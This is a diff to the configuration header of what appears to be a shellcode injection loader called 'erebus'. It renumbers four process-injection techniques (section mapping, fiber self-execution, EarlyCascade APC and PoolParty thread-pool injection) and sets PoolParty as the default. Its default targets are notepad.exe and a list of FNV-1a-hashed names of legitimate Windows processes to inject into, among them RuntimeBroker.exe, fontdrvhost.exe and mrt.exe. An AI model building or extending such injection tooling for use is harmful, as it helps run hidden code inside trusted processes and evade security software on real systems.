@@ -67,21 +67,23 @@
 // Target process for remote injection (defined per injection type below)
 
 // Injection technique:
-// 1 = NtQueueApcThread    - APC injection to suspended thread (Remote)
-// 2 = NtMapViewOfSection  - Section mapping injection (Remote)
-// 3 = CreateFiber         - Fiber-based execution (Self) - requires shellcode ABI compliance
-// 4 = EarlyCascade        - Early Bird APC injection (Remote)
-// 5 = PoolParty           - Worker Factory thread pool injection (Remote)
+// 1 = NtMapViewOfSection  - Section mapping injection (Remote)
+// 2 = CreateFiber         - Fiber-based execution (Self) - requires shellcode ABI compliance
+// 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
+// 4 = PoolParty           - Worker Factory thread pool injection (Remote)
 #ifndef CONFIG_INJECTION_TYPE
-#define CONFIG_INJECTION_TYPE 5
+#define CONFIG_INJECTION_TYPE 4
 #endif
 
-#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 2 || CONFIG_INJECTION_TYPE == 4
+#if CONFIG_INJECTION_TYPE == 1 || CONFIG_INJECTION_TYPE == 3
+#ifndef CONFIG_TARGET_PROCESS
 #define CONFIG_TARGET_PROCESS L"C:\\Windows\\System32\\notepad.exe"
+#endif
 #define CONFIG_INJECTION_MODE 1  // Remote injection (Create Suspended)
-#elif CONFIG_INJECTION_TYPE == 3
+#elif CONFIG_INJECTION_TYPE == 2
 #define CONFIG_INJECTION_MODE 2  // Self injection
-#elif  CONFIG_INJECTION_TYPE == 5
+#elif CONFIG_INJECTION_TYPE == 4
+#ifndef CONFIG_TARGET_PROCESS
 #define CONFIG_TARGET_PROCESS \
             erebus::HashStringFowlerNollVoVariant1a("RuntimeBroker.exe"), \
             erebus::HashStringFowlerNollVoVariant1a("fontdrvhost.exe"), \
@@ -100,18 +102,17 @@
             erebus::HashStringFowlerNollVoVariant1a("devenv.exe"), \
             erebus::HashStringFowlerNollVoVariant1a("cloudflared.exe"), \
             erebus::HashStringFowlerNollVoVariant1a("mrt.exe")
+#endif
 #define CONFIG_INJECTION_MODE 3  // Remote injection (Inject into existing process)
 #endif
 
 #if CONFIG_INJECTION_TYPE == 1
-#define ExecuteShellcode erebus::InjectionNtQueueApcThread
-#elif CONFIG_INJECTION_TYPE == 2
 #define ExecuteShellcode erebus::InjectionNtMapViewOfSection
-#elif CONFIG_INJECTION_TYPE == 3
+#elif CONFIG_INJECTION_TYPE == 2
 #define ExecuteShellcode erebus::InjectionCreateFiber
-#elif CONFIG_INJECTION_TYPE == 4
+#elif CONFIG_INJECTION_TYPE == 3
 #define ExecuteShellcode erebus::InjectionEarlyCascade
-#elif CONFIG_INJECTION_TYPE == 5
+#elif CONFIG_INJECTION_TYPE == 4
 #define ExecuteShellcode erebus::InjectionPoolParty
 #endif
 
